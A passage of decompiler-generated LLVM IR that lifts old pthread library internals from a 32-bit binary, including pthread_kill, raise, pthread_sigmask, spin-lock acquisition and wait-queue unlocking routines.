  %v4_804ca59 = icmp eq i8 %v3_804ca59, 0
  br i1 %v4_804ca59, label %dec_label_pc_804ca6c, label %dec_label_pc_804ca5f

dec_label_pc_804ca5f:                             ; preds = %dec_label_pc_804ca44
  %v1_804ca66 = add i32 %v3_804c96b, 64
  %v2_804ca66 = inttoptr i32 %v1_804ca66 to i8*
  %v3_804ca66 = load i8, i8* %v2_804ca66, align 1
  %v4_804ca66 = icmp eq i8 %v3_804ca66, 0
  br i1 %v4_804ca66, label %dec_label_pc_804ca98, label %dec_label_pc_804ca6c

dec_label_pc_804ca6c:                             ; preds = %dec_label_pc_804ca5f, %dec_label_pc_804ca44
  %v1_804ca73 = add i32 %v3_804c96b, 32
  %v2_804ca73 = inttoptr i32 %v1_804ca73 to i32*
  store i32 0, i32* %v2_804ca73, align 4
  %v1_804ca84 = add i32 %v3_804c96b, 88
  %v2_804ca84 = inttoptr i32 %v1_804ca84 to i8*
  store i8 1, i8* %v2_804ca84, align 1
  %v1_804ca90 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v2_804ca90 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_804ca90)
  br label %dec_label_pc_804ca98

dec_label_pc_804ca98:                             ; preds = %dec_label_pc_804ca2f.dec_label_pc_804ca98_crit_edge, %dec_label_pc_804ca5f, %dec_label_pc_804ca6c
  %v2_804ca9f.pre-phi = phi i32* [ %.pre3, %dec_label_pc_804ca2f.dec_label_pc_804ca98_crit_edge ], [ %v3_804ca4f, %dec_label_pc_804ca5f ], [ %v3_804ca4f, %dec_label_pc_804ca6c ]
  store i32 0, i32* %v2_804ca9f.pre-phi, align 4
  %v0_804caa6 = call i32 @pthread_testcancel()
  %v1_804cab9 = add i32 %v3_804c96b, 32
  %v2_804cab9 = inttoptr i32 %v1_804cab9 to i32*
  %v3_804cab9 = load i32, i32* %v2_804cab9, align 4
  store i32 %v3_804cab9, i32* %arg2, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804ca25, { 0, 2, 1 }
  uselistorder i32 %v4_804c9a8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_804c9a829, { 1, 0 }
  uselistorder i32 %v3_804c96b, { 6, 1, 3, 2, 4, 5, 0 }
  uselistorder i32 (i32)* @sigfillset, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @thread_self.2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ca98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ca25, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804c9a4, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804caca = load i32, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v0_804cacd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804cad7 = urem i32 %arg1, 1024
  %v2_804cadc = mul nuw nsw i32 %v1_804cad7, 16
  %v1_804cadf = add i32 %v2_804cadc, ptrtoint (i32* @global_var_805e6a0.146 to i32)
  store i32 %v1_804cadf, i32* @esi, align 4
  store i32 %v1_804cadf, i32* @eax, align 4
  %v1_804cae7 = call i32 @__pthread_lock(i32 %v0_804cacd)
  %v0_804caec = load i32, i32* @esi, align 4
  %v1_804caec = add i32 %v0_804caec, 8
  %v2_804caec = inttoptr i32 %v1_804caec to i32*
  %v3_804caec = load i32, i32* %v2_804caec, align 4
  %v1_804caef = icmp eq i32 %v3_804caec, 0
  br i1 %v1_804caef, label %dec_label_pc_804caf8, label %dec_label_pc_804caf3

dec_label_pc_804caf3:                             ; preds = %entry
  %v1_804caf3 = add i32 %v3_804caec, 16
  %v2_804caf3 = inttoptr i32 %v1_804caf3 to i32*
  %v3_804caf3 = load i32, i32* %v2_804caf3, align 4
  %v4_804caf3 = load i32, i32* @ebx, align 4
  %v15_804caf3 = icmp eq i32 %v3_804caf3, %v4_804caf3
  br i1 %v15_804caf3, label %dec_label_pc_804cb0b, label %dec_label_pc_804caf8

dec_label_pc_804caf8:                             ; preds = %dec_label_pc_804caf3, %entry
  store i32 %v0_804caec, i32* %stack_var_-28, align 4
  %v1_804cafc = inttoptr i32 %v0_804caec to i32*
  %v2_804cafc = call i32 @__pthread_unlock(i32* %v1_804cafc)
  br label %dec_label_pc_804cb32

dec_label_pc_804cb0b:                             ; preds = %dec_label_pc_804caf3
  %v1_804cb0e = add i32 %v3_804caec, 20
  %v2_804cb0e = inttoptr i32 %v1_804cb0e to i32*
  %v3_804cb0e = load i32, i32* %v2_804cb0e, align 4
  store i32 %v3_804cb0e, i32* @ebx, align 4
  store i32 %v0_804caec, i32* %stack_var_-28, align 4
  %v1_804cb12 = inttoptr i32 %v0_804caec to i32*
  %v2_804cb12 = call i32 @__pthread_unlock(i32* %v1_804cb12)
  %v0_804cb1d = load i32, i32* @ebx, align 4
  store i32 %v0_804cb1d, i32* %stack_var_-28, align 4
  %v2_804cb1e = call i32 @kill(i32 %v0_804cb1d, i32 %arg2)
  %v8_804cb28 = icmp eq i32 %v2_804cb1e, -1
  %v1_804cb29 = icmp eq i1 %v8_804cb28, false
  br i1 %v1_804cb29, label %dec_label_pc_804cb32, label %dec_label_pc_804cb2b

dec_label_pc_804cb2b:                             ; preds = %dec_label_pc_804cb0b
  %v0_804cb2b = load i32, i32* %stack_var_-28, align 4
  %v1_804cb2b = call i32 @__errno_location(i32 %v0_804cb2b)
  %v1_804cb30 = inttoptr i32 %v1_804cb2b to i32*
  %v2_804cb30 = load i32, i32* %v1_804cb30, align 4
  br label %dec_label_pc_804cb32

dec_label_pc_804cb32:                             ; preds = %dec_label_pc_804cb0b, %dec_label_pc_804caf8, %dec_label_pc_804cb2b
  %v0_804cb33 = phi i32 [ 0, %dec_label_pc_804cb0b ], [ 3, %dec_label_pc_804caf8 ], [ %v2_804cb30, %dec_label_pc_804cb2b ]
  store i32 %v0_804caca, i32* @esi, align 4
  ret i32 %v0_804cb33

; uselistorder directives
  uselistorder i32 %v3_804caec, { 1, 0, 2 }
  uselistorder i32 %v0_804caec, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_804cb32, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cb38 = load i32, i32* @ebx, align 4
  store i32 %v0_804cb38, i32* %stack_var_-4, align 4
  %v1_804cb3c = call i32 @__GI_pthread_self(i32 %v0_804cb38)
  %v0_804cb41 = load i32, i32* @ebx, align 4
  store i32 %v1_804cb3c, i32* %stack_var_-28, align 4
  %v4_804cb48 = call i32 @pthread_kill(i32 %v1_804cb3c, i32 %arg1, i32 %v0_804cb41, i32 %v0_804cb41)
  %v1_804cb54 = icmp eq i32 %v4_804cb48, 0
  br i1 %v1_804cb54, label %dec_label_pc_804cb62, label %dec_label_pc_804cb58

dec_label_pc_804cb58:                             ; preds = %entry
  %v0_804cb58 = load i32, i32* %stack_var_-28, align 4
  %v1_804cb58 = call i32 @__errno_location(i32 %v0_804cb58)
  %v2_804cb5d = inttoptr i32 %v1_804cb58 to i32*
  store i32 %v4_804cb48, i32* %v2_804cb5d, align 4
  br label %dec_label_pc_804cb62

dec_label_pc_804cb62:                             ; preds = %entry, %dec_label_pc_804cb58
  %v0_804cb65 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_804cb58 ]
  %v2_804cb64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cb64, i32* @ebx, align 4
  ret i32 %v0_804cb65

; uselistorder directives
  uselistorder i32 %v4_804cb48, { 1, 0 }
  uselistorder i32 %v1_804cb3c, { 1, 0 }
  uselistorder label %dec_label_pc_804cb62, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804cb7c = icmp eq i32 %arg2, 0
  br i1 %v1_804cb7c, label %entry.dec_label_pc_804cbee_crit_edge, label %dec_label_pc_804cb80

entry.dec_label_pc_804cbee_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804cbee

dec_label_pc_804cb80:                             ; preds = %entry
  %v2_804cb80 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_804cb80, i32* @ebx, align 4
  store i32 %v2_804cb80, i32* %stack_var_-156, align 4
  %v3_804cb8c = bitcast i32* %stack_var_-136 to i16*
  %v4_804cb8c = call i32 @memcpy(i16* %v3_804cb8c, i32 %arg2, i32 128)
  %v5_804cb94 = icmp eq i32 %arg1, 0
  %v9_804cb94 = icmp eq i32 %arg1, 1
  br i1 %v9_804cb94, label %dec_label_pc_804cbd5, label %dec_label_pc_804cb99

dec_label_pc_804cb99:                             ; preds = %dec_label_pc_804cb80
  %v9_804cb99 = icmp eq i32 %arg1, 2
  br i1 %v9_804cb99, label %dec_label_pc_804cba4, label %dec_label_pc_804cb9e

dec_label_pc_804cb9e:                             ; preds = %dec_label_pc_804cb99
  br i1 %v5_804cb94, label %dec_label_pc_804cbb6, label %dec_label_pc_804cbea

dec_label_pc_804cba4:                             ; preds = %dec_label_pc_804cb99
  %v0_804cba6 = load i32, i32* @global_var_8062a88.170, align 8
  store i32 %v2_804cb80, i32* %stack_var_-156, align 4
  %v2_804cbad = call i32 @__GI_sigaddset(i32 %v2_804cb80, i32 %v0_804cba6)
  br label %dec_label_pc_804cbb8

dec_label_pc_804cbb6:                             ; preds = %dec_label_pc_804cb9e
  br label %dec_label_pc_804cbb8

dec_label_pc_804cbb8:                             ; preds = %dec_label_pc_804cba4, %dec_label_pc_804cbb6
  store i32 %v2_804cb80, i32* %stack_var_-156, align 4
  %v1_804cbbf = call i32 @__GI_sigdelset(i32 %v2_804cb80)
  %v0_804cbc4 = load i32, i32* @global_var_8062a90.145, align 16
  %tmp20 = icmp slt i32 %v0_804cbc4, 1
  br i1 %tmp20, label %dec_label_pc_804cbea, label %dec_label_pc_804cbd0

dec_label_pc_804cbd0:                             ; preds = %dec_label_pc_804cbb8
  br label %dec_label_pc_804cbdd

dec_label_pc_804cbd5:                             ; preds = %dec_label_pc_804cb80
  br label %dec_label_pc_804cbdd

dec_label_pc_804cbdd:                             ; preds = %dec_label_pc_804cbd0, %dec_label_pc_804cbd5
  store i32 %v2_804cb80, i32* %stack_var_-156, align 4
  %v1_804cbde = call i32 @__GI_sigdelset(i32 %v2_804cb80)
  br label %dec_label_pc_804cbee

dec_label_pc_804cbea:                             ; preds = %dec_label_pc_804cb9e, %dec_label_pc_804cbb8
  br label %dec_label_pc_804cbee

dec_label_pc_804cbee:                             ; preds = %entry.dec_label_pc_804cbee_crit_edge, %dec_label_pc_804cbdd, %dec_label_pc_804cbea
  %v0_804cbf6 = phi i32 [ 0, %entry.dec_label_pc_804cbee_crit_edge ], [ %v2_804cb80, %dec_label_pc_804cbdd ], [ %v2_804cb80, %dec_label_pc_804cbea ]
  store i32 %arg1, i32* %stack_var_-156, align 4
  %v3_804cbf8 = inttoptr i32 %v0_804cbf6 to %_TYPEDEF_sigset_t*
  %v4_804cbf8 = call i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %v3_804cbf8, i32 %arg3)
  %v8_804cc02 = icmp eq i32 %v4_804cbf8, -1
  %v1_804cc03 = icmp eq i1 %v8_804cc02, false
  br i1 %v1_804cc03, label %dec_label_pc_804cc0c, label %dec_label_pc_804cc05

dec_label_pc_804cc05:                             ; preds = %dec_label_pc_804cbee
  %v0_804cc05 = load i32, i32* %stack_var_-156, align 4
  %v1_804cc05 = call i32 @__errno_location(i32 %v0_804cc05)
  %v1_804cc0a = inttoptr i32 %v1_804cc05 to i32*
  %v2_804cc0a = load i32, i32* %v1_804cc0a, align 4
  br label %dec_label_pc_804cc0c

dec_label_pc_804cc0c:                             ; preds = %dec_label_pc_804cbee, %dec_label_pc_804cc05
  %v0_804cc12 = phi i32 [ 0, %dec_label_pc_804cbee ], [ %v2_804cc0a, %dec_label_pc_804cc05 ]
  ret i32 %v0_804cc12

; uselistorder directives
  uselistorder i32 %v2_804cb80, { 0, 1, 7, 6, 3, 2, 5, 4, 8, 9 }
  uselistorder i32 %arg1, { 3, 2, 0, 1, 4, 5 }
  uselistorder label %dec_label_pc_804cc0c, { 1, 0 }
  uselistorder label %dec_label_pc_804cbee, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804cbea, { 1, 0 }
  uselistorder label %dec_label_pc_804cbdd, { 1, 0 }
  uselistorder label %dec_label_pc_804cbb8, { 1, 0 }
}

define i32 @wait_node_dequeue() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804cc1c = load i32, i32* @edx, align 4
  %v1_804cc1c = load i32, i32* @eax, align 4
  %v12_804cc1c = icmp eq i32 %v0_804cc1c, %v1_804cc1c
  %v1_804cc1e = icmp eq i1 %v12_804cc1c, false
  %v0_804cc39.pre = load i32, i32* @ecx, align 4
  br i1 %v1_804cc1e, label %dec_label_pc_804cc39, label %dec_label_pc_804cc20

dec_label_pc_804cc20:                             ; preds = %entry
  %v1_804cc20 = inttoptr i32 %v0_804cc39.pre to i32*
  %v2_804cc20 = load i32, i32* %v1_804cc20, align 4
  store i32 %v2_804cc20, i32* %ebx.global-to-local, align 4
  %v1_804cc24 = inttoptr i32 %v0_804cc1c to i32*
  %v2_804cc24 = load i32, i32* %v1_804cc24, align 4
  %v15_804cc24 = icmp eq i32 %v0_804cc39.pre, %v2_804cc24
  %v22_804cc24 = select i1 %v15_804cc24, i32 %v2_804cc20, i32 %v2_804cc24
  store i32 %v22_804cc24, i32* %v1_804cc24, align 4
  %v1_804cc28 = zext i1 %v15_804cc24 to i32
  %v2_804cc28 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804cc28 = and i32 %v2_804cc28, -256
  %v4_804cc28 = or i32 %v3_804cc28, %v1_804cc28
  store i32 %v4_804cc28, i32* %ebx.global-to-local, align 4
  %v4_804cc2b = icmp eq i1 %v15_804cc24, false
  br i1 %v4_804cc2b, label %dec_label_pc_804cc33.preheader, label %dec_label_pc_804cc3d

dec_label_pc_804cc33.preheader:                   ; preds = %dec_label_pc_804cc20
  %v0_804cc33.pre = load i32, i32* @edx, align 4
  %v0_804cc35.pre = load i32, i32* @ecx, align 4
  %v1_804cc337 = inttoptr i32 %v0_804cc33.pre to i32*
  %v2_804cc338 = load i32, i32* %v1_804cc337, align 4
  %v12_804cc3510 = icmp eq i32 %v0_804cc35.pre, %v2_804cc338
  %v1_804cc3711 = icmp eq i1 %v12_804cc3510, false
  br i1 %v1_804cc3711, label %dec_label_pc_804cc31, label %dec_label_pc_804cc39.loopexit

dec_label_pc_804cc31:                             ; preds = %dec_label_pc_804cc33.preheader, %dec_label_pc_804cc31
  %v2_804cc3312 = phi i32 [ %v2_804cc33, %dec_label_pc_804cc31 ], [ %v2_804cc338, %dec_label_pc_804cc33.preheader ]
  store i32 %v2_804cc3312, i32* @edx, align 4
  %v1_804cc33 = inttoptr i32 %v2_804cc3312 to i32*
  %v2_804cc33 = load i32, i32* %v1_804cc33, align 4
  %v12_804cc35 = icmp eq i32 %v0_804cc35.pre, %v2_804cc33
  %v1_804cc37 = icmp eq i1 %v12_804cc35, false
  br i1 %v1_804cc37, label %dec_label_pc_804cc31, label %dec_label_pc_804cc39.loopexit

dec_label_pc_804cc39.loopexit:                    ; preds = %dec_label_pc_804cc31, %dec_label_pc_804cc33.preheader
  %v0_804cc33.lcssa = phi i32 [ %v0_804cc33.pre, %dec_label_pc_804cc33.preheader ], [ %v2_804cc3312, %dec_label_pc_804cc31 ]
  br label %dec_label_pc_804cc39

dec_label_pc_804cc39:                             ; preds = %entry, %dec_label_pc_804cc39.loopexit
  %v1_804cc3b = phi i32 [ %v0_804cc33.lcssa, %dec_label_pc_804cc39.loopexit ], [ %v0_804cc1c, %entry ]
  %v0_804cc39 = phi i32 [ %v0_804cc35.pre, %dec_label_pc_804cc39.loopexit ], [ %v0_804cc39.pre, %entry ]
  %v1_804cc39 = inttoptr i32 %v0_804cc39 to i32*
  %v2_804cc39 = load i32, i32* %v1_804cc39, align 4
  %v2_804cc3b = inttoptr i32 %v1_804cc3b to i32*
  store i32 %v2_804cc39, i32* %v2_804cc3b, align 4
  br label %dec_label_pc_804cc3d

dec_label_pc_804cc3d:                             ; preds = %dec_label_pc_804cc20, %dec_label_pc_804cc39
  %v2_804cc3d = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_804cc3d

; uselistorder directives
  uselistorder i32 %v2_804cc338, { 1, 0 }
  uselistorder i32 %v0_804cc35.pre, { 2, 1, 0 }
  uselistorder i1 %v15_804cc24, { 1, 2, 0 }
  uselistorder i32 %v2_804cc24, { 1, 0 }
  uselistorder i32 %v0_804cc39.pre, { 1, 0, 2 }
  uselistorder i32 %v0_804cc1c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cc3d, { 1, 0 }
  uselistorder label %dec_label_pc_804cc39, { 1, 0 }
  uselistorder label %dec_label_pc_804cc31, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v0_804cc40 = load i32, i32* @esi, align 4
  %v0_804cc41 = load i32, i32* @ebx, align 4
  %v0_804cc42 = load i32, i32* @eax, align 4
  store i32 %v0_804cc42, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v2_804cc6e = ptrtoint i32* %stack_var_-16 to i32
  %v1_804cc8011 = inttoptr i32 %v0_804cc42 to i32*
  %v2_804cc8012 = load i32, i32* %v1_804cc8011, align 4
  store i32 1, i32* %v1_804cc8011, align 4
  %v1_804cc8213 = icmp eq i32 %v2_804cc8012, 0
  %v1_804cc8415 = icmp eq i1 %v1_804cc8213, false
  br i1 %v1_804cc8415, label %dec_label_pc_804cc4b, label %dec_label_pc_804cc86

dec_label_pc_804cc4b:                             ; preds = %entry, %dec_label_pc_804cc7b.backedge
  %v0_804cc4b = load i32, i32* @esi, align 4
  %v1_804cc4b = add i32 %v0_804cc4b, -49
  %v6_804cc4b = sub i32 48, %v0_804cc4b
  %v7_804cc4b = and i32 %v6_804cc4b, %v0_804cc4b
  %v8_804cc4b = icmp slt i32 %v7_804cc4b, 0
  %v9_804cc4b = icmp eq i32 %v1_804cc4b, 0
  %v10_804cc4b = icmp slt i32 %v1_804cc4b, 0
  %v3_804cc4e = icmp eq i1 %v10_804cc4b, %v8_804cc4b
  %v4_804cc4e = icmp eq i1 %v9_804cc4b, false
  %v5_804cc4e = and i1 %v4_804cc4e, %v3_804cc4e
  br i1 %v5_804cc4e, label %dec_label_pc_804cc58, label %dec_label_pc_804cc50

dec_label_pc_804cc50:                             ; preds = %dec_label_pc_804cc4b
  %v1_804cc50 = call i32 @sched_yield(i32 %v0_804cc41)
  %v0_804cc55 = load i32, i32* @esi, align 4
  %v1_804cc55 = add i32 %v0_804cc55, 1
  store i32 %v1_804cc55, i32* @esi, align 4
  br label %dec_label_pc_804cc7b.backedge

dec_label_pc_804cc58:                             ; preds = %dec_label_pc_804cc4b
  store i32 0, i32* %stack_var_-16, align 4
  store i32 0, i32* @esi, align 4
  %v0_804cc6a = load i32, i32* @edx, align 4
  %v4_804cc73 = call i32 @nanosleep(i32 %v2_804cc6e, i32 0, i32 %v0_804cc6a, i32 %v0_804cc6a)
  br label %dec_label_pc_804cc7b.backedge

dec_label_pc_804cc7b.backedge:                    ; preds = %dec_label_pc_804cc58, %dec_label_pc_804cc50
  %v0_804cc80.pre = load i32, i32* @ebx, align 4
  %v1_804cc80 = inttoptr i32 %v0_804cc80.pre to i32*
  %v2_804cc80 = load i32, i32* %v1_804cc80, align 4
  store i32 1, i32* %v1_804cc80, align 4
  %v1_804cc82 = icmp eq i32 %v2_804cc80, 0
  %v1_804cc84 = icmp eq i1 %v1_804cc82, false
  br i1 %v1_804cc84, label %dec_label_pc_804cc4b, label %dec_label_pc_804cc86

dec_label_pc_804cc86:                             ; preds = %dec_label_pc_804cc7b.backedge, %entry
  %v2_804cc80.lcssa = phi i32 [ %v2_804cc8012, %entry ], [ %v2_804cc80, %dec_label_pc_804cc7b.backedge ]
  store i32 %v0_804cc41, i32* @ebx, align 4
  store i32 %v0_804cc40, i32* @esi, align 4
  ret i32 %v2_804cc80.lcssa

; uselistorder directives
  uselistorder i32 %v1_804cc4b, { 1, 0 }
  uselistorder label %dec_label_pc_804cc4b, { 1, 0 }
}

define i32 @wait_node_free() local_unnamed_addr {
entry:
  %v0_804cc8c = load i32, i32* @ebx, align 4
  %v0_804cc8d = load i32, i32* @eax, align 4
  store i32 %v0_804cc8d, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_8063388.171 to i32), i32* @eax, align 4
  %v1_804cc97 = call i32 @__pthread_acquire(i32 %v0_804cc8c)
  %v0_804cc9c = load i32, i32* @global_var_8063384.172, align 4
  %v1_804cca1 = load i32, i32* @ebx, align 4
  %v2_804cca1 = inttoptr i32 %v1_804cca1 to i32*
  store i32 %v0_804cc9c, i32* %v2_804cca1, align 4
  %v0_804cca3 = load i32, i32* @ebx, align 4
  store i32 %v0_804cca3, i32* @global_var_8063384.172, align 4
  store i32 0, i32* @global_var_8063388.171, align 8
  ret i32 %v0_804cc9c
}

define i32 @restart.3() local_unnamed_addr {
entry:
  %v0_804ccba = load i32, i32* @eax, align 4
  %v1_804ccbb = call i32 @__pthread_restart_new(i32 %v0_804ccba)
  ret i32 %v1_804ccbb
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ccc4 = load i32, i32* @ebp, align 4
  %v0_804ccc5 = load i32, i32* @edi, align 4
  %v0_804ccc6 = load i32, i32* @esi, align 4
  %v0_804ccc7 = load i32, i32* @ebx, align 4
  store i32 %v0_804ccc7, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* @esi, align 4
  br label %dec_label_pc_804cccf

dec_label_pc_804cccf:                             ; preds = %dec_label_pc_804cccf.backedge, %entry
  %v24_804ccda = phi i32 [ %v0_804cccf.pre, %dec_label_pc_804cccf.backedge ], [ %tmp10, %entry ]
  %v1_804cccf = inttoptr i32 %v24_804ccda to i32*
  %v2_804cccf = load i32, i32* %v1_804cccf, align 4
  store i32 %v2_804cccf, i32* %edx.global-to-local, align 4
  %tmp = or i32 %v2_804cccf, 1
  %tmp54 = icmp eq i32 %tmp, 1
  br i1 %tmp54, label %dec_label_pc_804ccd6, label %dec_label_pc_804ccfd.lr.ph.lr.ph

dec_label_pc_804ccd6:                             ; preds = %dec_label_pc_804cccf
  store i32 0, i32* @ecx, align 4
  %v2_804ccda = load i32, i32* %v1_804cccf, align 4
  %v15_804ccda = icmp eq i32 %v2_804cccf, %v2_804ccda
  %v22_804ccda = select i1 %v15_804ccda, i32 0, i32 %v2_804ccda
  store i32 %v22_804ccda, i32* %v1_804cccf, align 4
  %v1_804ccde = zext i1 %v15_804ccda to i32
  %v2_804ccde = load i32, i32* %edx.global-to-local, align 4
  %v3_804ccde = and i32 %v2_804ccde, -256
  %v4_804ccde = or i32 %v3_804ccde, %v1_804ccde
  store i32 %v4_804ccde, i32* %edx.global-to-local, align 4
  %v4_804cce1 = icmp eq i1 %v15_804ccda, false
  br i1 %v4_804cce1, label %dec_label_pc_804cccf.backedge, label %dec_label_pc_804cd6a.loopexit

dec_label_pc_804cccf.backedge:                    ; preds = %dec_label_pc_804ccd6, %dec_label_pc_804cd3c, %dec_label_pc_804cd46
  %v0_804cccf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cccf

dec_label_pc_804ccfd.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804cccf
  store i32 %v2_804cccf, i32* @ebx, align 4
  store i32 %v24_804ccda, i32* @ebp, align 4
  store i32 %v2_804cccf, i32* @edi, align 4
  store i32 %v24_804ccda, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804ccfd.lr.ph

dec_label_pc_804ccfd:                             ; preds = %dec_label_pc_804ccfd.lr.ph, %dec_label_pc_804cd03
  %v0_804cd3331 = phi i32 [ %v0_804cd37345, %dec_label_pc_804ccfd.lr.ph ], [ %v2_804cd17, %dec_label_pc_804cd03 ]
  %v0_804cd3030 = phi i32 [ %v0_804cd05544, %dec_label_pc_804ccfd.lr.ph ], [ %v0_804cd15, %dec_label_pc_804cd03 ]
  %v0_804cd0729 = phi i32 [ %v0_804cd07643, %dec_label_pc_804ccfd.lr.ph ], [ %v1_804cd15, %dec_label_pc_804cd03 ]
  %v1_804ccfd = add i32 %v0_804cd3331, 8
  %v2_804ccfd = inttoptr i32 %v1_804ccfd to i32*
  %v3_804ccfd = load i32, i32* %v2_804ccfd, align 4
  %v4_804ccfd = icmp eq i32 %v3_804ccfd, 0
  br i1 %v4_804ccfd, label %dec_label_pc_804cd1e, label %dec_label_pc_804cd03

dec_label_pc_804cd03:                             ; preds = %dec_label_pc_804ccfd
  store i32 %v0_804cd3331, i32* @ecx, align 4
  store i32 %v0_804cd3030, i32* @edx, align 4
  store i32 %v0_804cd0729, i32* @eax, align 4
  %v0_804cd09 = call i32 @wait_node_dequeue()
  %v0_804cd0e = load i32, i32* @ebx, align 4
  store i32 %v0_804cd0e, i32* @eax, align 4
  %v0_804cd10 = call i32 @wait_node_free()
  %v0_804cd15 = load i32, i32* @ebp, align 4
  %v1_804cd15 = load i32, i32* @esi, align 4
  %v1_804cd17 = inttoptr i32 %v0_804cd15 to i32*
  %v2_804cd17 = load i32, i32* %v1_804cd17, align 4
  store i32 %v2_804cd17, i32* @ebx, align 4
  %v9_804cd37 = icmp eq i32 %v2_804cd17, 1
  %v1_804cd3a = icmp eq i1 %v9_804cd37, false
  br i1 %v1_804cd3a, label %dec_label_pc_804ccfd, label %dec_label_pc_804cd3c

dec_label_pc_804cd1e:                             ; preds = %dec_label_pc_804ccfd
  %v1_804cd1e = add i32 %v0_804cd3331, 4
  %v2_804cd1e = inttoptr i32 %v1_804cd1e to i32*
  %v3_804cd1e = load i32, i32* %v2_804cd1e, align 4
  %v1_804cd21 = add i32 %v3_804cd1e, 24
  %v2_804cd21 = inttoptr i32 %v1_804cd21 to i32*
  %v3_804cd21 = load i32, i32* %v2_804cd21, align 4
  %v5_804cd28 = icmp slt i32 %v3_804cd21, %stack_var_-24.1.ph46
  br i1 %v5_804cd28, label %dec_label_pc_804cd33, label %dec_label_pc_804cd2a

dec_label_pc_804cd2a:                             ; preds = %dec_label_pc_804cd1e
  store i32 %v0_804cd3331, i32* @edi, align 4
  store i32 %v0_804cd3030, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804cd33

dec_label_pc_804cd33:                             ; preds = %dec_label_pc_804cd1e, %dec_label_pc_804cd2a
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.1.ph46, %dec_label_pc_804cd1e ], [ %v3_804cd21, %dec_label_pc_804cd2a ]
  store i32 %v0_804cd3331, i32* @ebp, align 4
  %v1_804cd35 = inttoptr i32 %v0_804cd3331 to i32*
  %v2_804cd35 = load i32, i32* %v1_804cd35, align 4
  store i32 %v2_804cd35, i32* @ebx, align 4
  %v9_804cd3726 = icmp eq i32 %v2_804cd35, 1
  %v1_804cd3a28 = icmp eq i1 %v9_804cd3726, false
  br i1 %v1_804cd3a28, label %dec_label_pc_804ccfd.lr.ph, label %dec_label_pc_804cd3c

dec_label_pc_804ccfd.lr.ph:                       ; preds = %dec_label_pc_804ccfd.lr.ph.lr.ph, %dec_label_pc_804cd33
  %stack_var_-24.1.ph46 = phi i32 [ -2147483648, %dec_label_pc_804ccfd.lr.ph.lr.ph ], [ %stack_var_-24.0, %dec_label_pc_804cd33 ]
  %v0_804cd37345 = phi i32 [ %v2_804cccf, %dec_label_pc_804ccfd.lr.ph.lr.ph ], [ %v2_804cd35, %dec_label_pc_804cd33 ]
  %v0_804cd05544 = phi i32 [ %v24_804ccda, %dec_label_pc_804ccfd.lr.ph.lr.ph ], [ %v0_804cd3331, %dec_label_pc_804cd33 ]
  %v0_804cd07643 = phi i32 [ %v24_804ccda, %dec_label_pc_804ccfd.lr.ph.lr.ph ], [ %v0_804cd0729, %dec_label_pc_804cd33 ]
  br label %dec_label_pc_804ccfd

dec_label_pc_804cd3c:                             ; preds = %dec_label_pc_804cd03, %dec_label_pc_804cd33
  %stack_var_-24.1.ph.lcssa = phi i32 [ %stack_var_-24.0, %dec_label_pc_804cd33 ], [ %stack_var_-24.1.ph46, %dec_label_pc_804cd03 ]
  %v0_804cd33.lcssa = phi i32 [ %v2_804cd35, %dec_label_pc_804cd33 ], [ %v2_804cd17, %dec_label_pc_804cd03 ]
  %v8_804cd3c = icmp eq i32 %stack_var_-24.1.ph.lcssa, -2147483648
  br i1 %v8_804cd3c, label %dec_label_pc_804cccf.backedge, label %dec_label_pc_804cd46

dec_label_pc_804cd46:                             ; preds = %dec_label_pc_804cd3c
  %v0_804cd48 = load i32, i32* @edi, align 4
  %v1_804cd48 = add i32 %v0_804cd48, 8
  %v2_804cd48 = inttoptr i32 %v1_804cd48 to i32*
  %v3_804cd48 = load i32, i32* %v2_804cd48, align 4
  store i32 %v0_804cd33.lcssa, i32* %v2_804cd48, align 4
  %v1_804cd4b = icmp eq i32 %v3_804cd48, 0
  %v1_804cd4d = icmp eq i1 %v1_804cd4b, false
